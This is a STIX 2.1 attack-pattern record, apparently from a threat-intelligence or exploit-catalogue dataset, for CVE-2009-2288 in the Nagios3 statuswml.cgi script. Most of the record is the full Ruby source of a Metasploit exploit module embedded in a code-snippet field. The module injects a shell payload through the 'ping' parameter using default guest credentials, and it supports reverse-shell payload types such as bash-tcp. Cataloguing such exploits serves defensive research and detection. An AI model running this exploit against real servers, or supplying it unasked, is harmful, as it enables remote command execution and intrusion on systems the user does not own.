{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d785fe65-47a2-49b3-9895-5f409552726f",
    "created": "2024-08-14T17:14:04.720993Z",
    "modified": "2024-08-14T17:14:04.720997Z",
    "name": "Nagios3 statuswml.cgi Ping Command Execution",
    "description": " This module abuses a metacharacter injection vulnerability in the Nagios3 statuswml.cgi script. This flaw is triggered when shell metacharacters are present in the parameters to the ping and traceroute commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/nagios3_statuswml_ping.rb",
            "external_id": "nagios3_statuswml_ping.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2288"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nagios3 statuswml.cgi Ping Command Execution',\n      'Description'    => %q{\n          This module abuses a metacharacter injection vulnerability in the\n        Nagios3 statuswml.cgi script. This flaw is triggered when shell\n        metacharacters are present in the parameters to the ping and\n        traceroute commands.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2288' ],\n          [ 'OSVDB', '55281'],\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'BadChars'    => '<>',\n          'Compat'      =>\n            {\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-06-22'))\n\n    register_options(\n      [\n        OptString.new('URI',  [true, \"The full URI path to statuswml.cgi\", \"/nagios3/cgi-bin/statuswml.cgi\"]),\n        OptString.new('USER', [true, \"The username to authenticate with\", \"guest\"]),\n        OptString.new('PASS', [true, \"The password to authenticate with\", \"guest\"]),\n      ])\n  end\n\n  def exploit\n\n    uri = normalize_uri(datastore['URI'])\n    print_status(\"Sending request to http://#{rhost}:#{rport}#{uri}\")\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'headers'   => { 'Authorization' => 'Basic ' + Rex::Text.encode_base64(\"#{datastore['USER']}:#{datastore['PASS']}\") },\n      'vars_post' =>\n      {\n        'ping' => ';' + payload.encoded + '&'\n      }\n    }, 10)\n\n\n    if(not res)\n      if session_created?\n        print_status(\"Session created, enjoy!\")\n      else\n        print_error(\"No response from the server\")\n      end\n      return\n    end\n\n    if(res.code == 401)\n      print_error(\"Please specify correct values for USER and PASS\")\n      return\n    end\n\n    if(res.code == 404)\n      print_error(\"Please specify the correct path to statuswml.cgi in the URI parameter\")\n      return\n    end\n\n    if(res.body =~ /Invalid host name/)\n      print_error(\"This server has already been patched\")\n      return\n    end\n\n    if(res.body =~ /p mode='nowrap'>(.*)<\\/p>/smi)\n      print_status(\"Displaying command response\")\n      out = $1\n      print_line(out.gsub(/<b>|<\\/b>|<br.>/, ''))\n      return\n    end\n\n    print_status(\"Unknown response\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-06-22",
    "x_mitre_platforms": [
        "['unix']"
    ]
}